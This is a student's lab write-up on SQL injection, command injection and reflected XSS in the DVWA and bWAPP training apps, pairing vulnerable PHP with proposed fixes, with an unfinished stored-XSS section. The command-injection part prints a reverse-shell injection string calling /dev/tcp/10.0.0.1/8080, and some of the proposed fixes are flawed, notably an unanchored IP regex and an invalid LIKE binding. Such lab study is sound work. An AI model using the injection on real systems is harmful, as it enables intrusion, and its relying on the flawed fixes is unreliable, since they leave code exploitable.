# Web Application Security Lab 6 Writeup
Olson Section 1

Ryan Cheevers-Brown

## SQL Injection (DVWA), SQL Injection (GET/Search) (BWApp)

The root cause in the DVWA "low" script is the lack of sanitization - the `$id` variable is taken directly from the input form. I can put any code I want into the `$id` variable via the GET parameter and have the web server run it. The second line has been simplified for readibility, as it does a lot of error handling. 

```
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query(..., $query);
```

This vulnerability is fixed in DVWA's Impossible difficulty using a prepared query and PHP's PDOs (prepared data objects). The SQL statement is created as a PDO with the `prepare` method as seen on the first line. This separates the SQL code from the user input and guarantees that the user can't easily escape the SQL query with `'` or `;` characters. The next line binds the `$id` variable to the `:id` parameter in the SQL query and ensures that it is treated as an integer. The query is then safely executed. 

```
$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
$data->bindParam( ':id', $id, PDO::PARAM_INT );
$data->execute();
```

In BWApp, the vulnerability is very similar:

```
$title  = $_GET["title"];
$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli_($title) ."%'";
$recordset = mysql_query($sql, $link);
```

This code takes the `$title` value directly from the user's `GET` parameter and passes it into the SQL query without doing any parameterization or sanitization. 

DVWA's Impossible mitigation can be applied to this code as well. It would look something like this:

```
$title = $_GET["title"];
$data = $db->prepare( 'SELECT * FROM movies WHERE title LIKE %(:title)%;' );
$data->bindParam( ':title', $title, PDO::PARAM_STR );
$data->execute();
```
This code creates a prepared query structured the same as the original BWApp query. It then does the parameter binding, but using a PDO string instead of an integer. It then executes the query. This should be very difficult to SQL inject into. 

TODO: Additional mitigations?

## Command Injection (DVWA), OS Command Injection (BWApp)

The root cause in DVWA's "low" script is again, unsanitized input. This gives me (the attacker) the ability to execute any command they want by inserting a pipe `|` or semicolon `;` to break the command, followed by whatever secondary command they want. 

```
$target = $_REQUEST[ 'ip' ];
$cmd = shell_exec( 'ping -c 4 ' . $target );
```

DVWA's Impossible mode mitigates this by removing slashes, exploding the input into four octets, and then making sure each of the octets is numeric. This should cause errors if the input is not structured in the form of an IP address. However, this still leaves a vulnerability present: using a fifth octet to inject a command. 

```
$target = $_REQUEST[ 'ip' ];
$target = stripslashes( $target );
$octet = explode( ".", $target );
if( #each octet is numeric ){
    $target = octet[1] . "." ... "." octet[3] ;
    $cmd = shell_exec( 'ping -c 4 ' . $target );
}
```

The code does not check to see if more than four 'octets' are present after the `explode()` command. This leaves the door open for an input structured like this: 

```
1.1.1.1.;bash -i >& unbase64(base64-encoded("/dev/tcp/10.0.0.1/8080 0>&1"))
```

This would create a reverse shell listener that the attacker could then connect to. I would fix this problem (and simplify the code) by matching the user's input string to a very tightly written regular expression. This regex checks to make sure that the user's input is structured as four groups of 1 to 3 numbers separated by a single perio, and that there are no additional characters on the beginning or end. This would make command injection close to, if not entirely impossible. 

```
target = requests.get("ip")
check_regex = "/([0-9]{1,3}\.){3}[0-9]{1,3}/g"
regex_match = regex.match(input, check_regex)
```

The BWApp script doesn't do any input validation:

```
$target = $_POST['target'];
echo shell_exec("nslookup " . commandi($target));>
```

It takes the parameter from the POST request and passes it directly to NSLookup. This could be mitigated with the same regex checking as proposed for the DVWA Impossible mode improvement. I personally wouldn't bother implementing the current DVWA Impossible mitigation, as it's already vulnerable. 

## Reflected XSS (DVWA), XSS - Reflected (GET) (BWApp)

The DVWA `low` script is vulnerable: 

```
header ("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
```

The `$name` GET parameter is passed directly into the HTML without any validation or sanitization, meaning that any code sent in the `name` GET parameter is directly output into the resulting web page. This means that an attacker can trick a user into clicking a link with a payload in the `$name` GET parameter included which will then execute said payload on the user's browser without the user's knowlege. 

Additionally, the code disables any browser built-in XSS protection by disabling XSS protection in the header. This is also NOT recommended for any production systems. 

DVWA's Impossible mode mitigates these vulnerabilities with several changes to the code. The first is simply leaving out the line that disables the browser's built-in XSS protection. The second is using PHP's `htmlspecialchars()` function to properly encode the entire input string, preventing any part of it from being interpreted as JS or HTML. 

```
$name = htmlspecialchars( $_GET[ 'name '] );
```

Finally, the Impossible mode also checks that the anti-CSRF token submitted as part of the `$_REQUEST` matches the one stored server-side in `'$_SESSION`. 

```
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

These mitigations would make an XSS attack much more difficult to pull off using this web page. 

The BWApp script has slightly different code, but effectively the same vulnerabilities as the DVWA Low mode. 

```
$first = $_GET["firstname"];
$last = $_GET["lastname"];
echo "Welcome " . $first . " " . $last;
```

There is no input validation or sanitization, so I can input absolutely any code I want in the last name parameter and have it execute on the target system (once they click my specially crafted link). 

The mitigation from DVWA's Impossible mode, as applied to DVWA,  would look something like this: 

```
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
$first = htmlspecialchars( $_GET[ 'firstname' ]);
$last = htmlspecialchars( $_GET[ 'lastname' ]);
echo "Welcome " . $first . " " . $last;
```

Both the first and last name parameters would be HTML-ified by the PHP function, and the page would be checked for the CSRF token. This would prevent any code inserted as a first or last name parameter from executing as HTML or JS. 

## XSS - Stored (DVWA), XSS - Stored (Blog) (DVWA)

The root cause in DVWA's `low` script:

```

```





## Questions

Root cause in DVWA "low"??

DVWA "impossible" mitigation?

root cause in BWAPP script?

Impossible mitigation -> bwapp?

additional mitigations for DVWA?

